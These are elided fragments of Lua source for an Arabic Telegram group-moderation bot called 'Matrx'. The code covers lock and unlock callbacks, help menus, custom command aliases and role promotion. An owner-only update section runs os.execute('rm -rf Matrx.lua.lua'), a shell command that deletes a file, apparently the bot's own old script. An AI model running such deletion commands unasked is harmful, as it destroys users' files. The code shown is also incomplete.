DevRio:del(Matrx..'Rio:Lock:Forwards'..data.chat_id_) 
...
DevRio:set(Matrx.."Rio:Lock:Bots"..data.chat_id_,"kick")  
Text = "*᥀︙تم قفل البوتات بالطرد بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/LockBotList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockBotKed:'..data.sender_user_id_ then
DevRio:set(Matrx.."Rio:Lock:Bots"..data.chat_id_,"ked")   
...
DevRio:set(Matrx.."Rio:Lock:Bots"..data.chat_id_,"del")  
...
DevRio:del(Matrx.."Rio:Lock:Bots"..data.chat_id_) 
...
DevRio:hset(Matrx.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","kick")  
Text = "*᥀︙تم قفل التكرار بالطرد بنجاح*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/LockSpamList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/lockSpamKed:'..data.sender_user_id_ then
DevRio:hset(Matrx.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","keed")  
...
DevRio:hset(Matrx.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","del")  
...
DevRio:hset(Matrx.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User","mute")  
...
DevRio:hdel(Matrx.."Rio:Spam:Group:User"..data.chat_id_ ,"Spam:User")  
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Source = DevRio:get(Matrx..'Rio:Source')
local Text = [[
...
os.execute('rm -rf Matrx.lua.lua') 
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/SourceList:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Media = DevRio:get(Matrx..'Rio:Media')
local Text = [[
...
local List = DevRio:smembers(Matrx.."Rio:cleaner"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/MediaHome:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end end
...
local List = DevRio:smembers(Matrx.."Rio:cleanermusic"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevRio:del(Matrx.."Rio:cleanermusic"..data.chat_id_)
else
...
if DevRio:get(Matrx.."Rio:Left:Bot"..Matrx) then
...
ChatLeave(data.chat_id_, Matrx) 
DevRio:srem(Matrx.."Rio:Groups",data.chat_id_)
end           
...
if not DevRio:get(Matrx.."Rio:Lock:GpLinksinline"..data.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..data.chat_id_)) or DevRio:get(Matrx.."Private:Group:Link"..data.chat_id_) 
...
if not DevRio:get(Matrx..'Rio:Lock:GpLinks'..data.chat_id_) then 
if DevRio:get(Matrx.."Rio:Groups:Links"..data.chat_id_) then
send(data.chat_id_, data.id_, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(Matrx.."Rio:Groups:Links"..data.chat_id_), 1, "html")
else 
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local order = DevRio:get(Matrx..'Rio:order')
local Text = [[
...
DevRio:set(Matrx..'Rio:Lock:Id:Photo'..data.chat_id_,true)
Text = "*᥀︙تم تعطيل الايدي بالصوره*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
DevRio:del(Matrx..'Rio:Lock:Id:Photo'..data.chat_id_)
...
DevRio:set(Matrx..'Rio:Lock:Id'..data.chat_id_,true)
...
DevRio:del(Matrx..'Rio:Lock:Id'..data.chat_id_)
...
DevRio:set(Matrx.."Rio:Lock:GpLinks"..data.chat_id_,"ok")
...
DevRio:del(Matrx.."Rio:Lock:GpLinks"..data.chat_id_)
...
DevRio:set(Matrx.."Rio:Lock:GpLinksinline"..data.chat_id_,"ok")
...
DevRio:del(Matrx.."Rio:Lock:GpLinksinline"..data.chat_id_)
...
DevRio:del(Matrx.."Rio:Lock:Welcome"..data.chat_id_)
...
DevRio:set(Matrx.."Rio:Lock:Welcome"..data.chat_id_,true)
...
DevRio:set(Matrx..'Rio:Lock:AllRed'..data.chat_id_,true)
...
DevRio:del(Matrx..'Rio:Lock:AllRed'..data.chat_id_)
...
DevRio:set(Matrx..'Rio:Lock:GpRed'..data.chat_id_,true)
...
DevRio:del(Matrx..'Rio:Lock:GpRed'..data.chat_id_)
...
DevRio:set(Matrx.."Rio:Del:Me"..data.chat_id_, true)
Text = "*᥀︙تم تعطيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Matrx.."Rio:Del:Me"..data.chat_id_)
Text = "*᥀︙تم تفعيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:set(Matrx.."Rio:Kick:Me"..data.chat_id_, true)
...
DevRio:del(Matrx.."Rio:Kick:Me"..data.chat_id_)
...
DevRio:set(Matrx.."Rio:Lock:KickBan"..data.chat_id_,"true")
Text = "*᥀︙تم تعطيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Matrx.."Rio:Lock:KickBan"..data.chat_id_)
Text = "*᥀︙تم تفعيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:set(Matrx.."Rio:Lock:ProSet"..data.chat_id_,"true")
Text = "*᥀︙تم تعطيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:del(Matrx.."Rio:Lock:ProSet"..data.chat_id_)
Text = "*᥀︙تم تفعيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevRio:set(Matrx..'Rio:Lock:Games'..data.chat_id_,true)  
...
DevRio:del(Matrx..'Rio:Lock:Games'..data.chat_id_) 
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Matrx..'Rio:Help')
local Text = [[
...
local Help = DevRio:get(Matrx..'Rio:Help1')
local Text = [[
...
local Help = DevRio:get(Matrx..'Rio:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
...
local Help = DevRio:get(Matrx..'Rio:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
...
local Help = DevRio:get(Matrx..'Rio:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
...
local Help = DevRio:get(Matrx..'Rio:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Matrx..'Rio:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
if text and DevRio:get(Matrx.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevRio:get(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevRio:del(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevRio:del(Matrx.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:srem(Matrx.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevRio:del(Matrx.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevRio:get(Matrx..'Rio:NameBot') or "ماتركس")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(Matrx..'Rio:NameBot') or "ماتركس")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevRio:get(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevRio:get(Matrx.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevRio:set(Matrx.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevRio:del(Matrx.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevRio:set(Matrx.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevRio:get(Matrx.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevRio:get(Matrx.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevRio:del(Matrx.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevRio:smembers(Matrx.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevRio:get(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
keyboard = {} 
keyboard.inline_keyboard = {{{text="• مسح الاوامر المضافه •",callback_data="/DelCmd:"..msg.sender_user_id_},{text="• ترتيب الاوامر •",callback_data="/SetCmd:"..msg.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = '• TeAm Matrx •',url="t.me/FZOFZ"}}}
Msg_id = msg.id_/2097152/0.5
...
local List = DevRio:smembers(Matrx.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(Matrx.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevRio:set(Matrx.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(Matrx.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"᥀︙تم ترتيب الاوامر بالشكل التالي ~\n᥀︙ ايدي - ا .\n᥀︙ رفع مميز - م .\n᥀︙رفع ادمن - اد .\n᥀︙ رفع مدير - مد . \n᥀︙ رفع منشى - من . \n᥀︙ رفع منشئ الاساسي - اس  .\n᥀︙ رفع مطور - مط .\n᥀︙رفع مطور ثانوي - ثانوي .\n᥀︙ تنزيل الكل - تك .\n᥀︙ تعطيل الايدي بالصوره - تعط .\n᥀︙ تفعيل الايدي بالصوره - تفع .\n᥀︙ الرابط - ر .\n᥀︙ ردود المدير - رر .\n᥀︙ مسح المكتومين - ،، .\n᥀︙ اضف رد - رد .\n᥀︙ مسح سحكاتي - سح .\n᥀︙ مسح رسائلي - رس .\n᥀︙ غنيلي - غ .\n᥀︙مسح قائمه العام")  
end
if text == "اضف امر" and ChCheck(msg) or text == "اضافة امر" and ChCheck(msg) or text == "اضافه امر" and ChCheck(msg) then
DevRio:set(Matrx.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevRio:set(Matrx.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevRio:smembers(Matrx.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevRio:get(Matrx.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevRio:smembers(Matrx.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Matrx.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevRio:del(Matrx.."Coomds"..msg.chat_id_)
end
...
DevRio:set(Matrx.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevRio:sadd(Matrx.."Coomds"..msg.chat_id_,ComdNew)  
DevRio:setex(Matrx.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevRio:del(Matrx.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevRio:get(Matrx.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevRio:del(Matrx.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevRio:get(Matrx.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevRio:set(Matrx.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
...
if DevRio:sismember(Matrx.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(Matrx.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'FZOFZ')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevRio:sadd(Matrx..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'FZOFZ')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevRio:sadd(Matrx..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'FZOFZ')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevRio:sadd(Matrx..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(Matrx..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'FZOFZ')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(Matrx..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'FZOFZ')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(Matrx..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'FZOFZ')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
...
if DevRio:sismember(Matrx.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(Matrx.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'FZOFZ')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Matrx..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:set(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'FZOFZ')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Matrx..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:set(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'FZOFZ')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(Matrx..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:set(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'FZOFZ')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:srem(Matrx..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:del(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'FZOFZ')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(Matrx..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:del(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'FZOFZ')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(Matrx..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:del(Matrx.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'FZOFZ')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:incr(Matrx..'Rio:UsersMsgs'..Matrx..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Matrx..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Matrx..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(Matrx.."Rio:Users",msg.chat_id_) then
DevRio:sadd(Matrx.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتحديث  سورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب أحصائيات  سورس ماتركس فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
